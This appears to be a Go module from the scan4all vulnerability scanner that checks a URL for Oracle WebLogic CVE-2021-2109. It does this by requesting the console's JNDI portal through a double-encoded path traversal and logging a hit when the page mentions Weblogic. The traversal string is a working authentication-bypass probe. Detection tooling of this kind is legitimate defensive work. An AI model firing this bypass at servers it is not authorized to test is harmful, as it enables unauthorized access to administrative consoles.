package weblogic

import (
	"github.com/GhostTroops/scan4all/lib/util"
)

func CVE_2021_2109(url string) bool {
	if req, err := util.HttpRequset(url+"/console/css/%252e%252e%252f/consolejndi.portal", "GET", "", false, nil); err == nil {
		if req.StatusCode == 200 && util.StrContains(req.Body, "Weblogic") {
			util.SendLog(req.RequestUrl, "CVE-2021-2109", "Found vuln Weblogic", "")
			return true
		}
	}
	return false
}
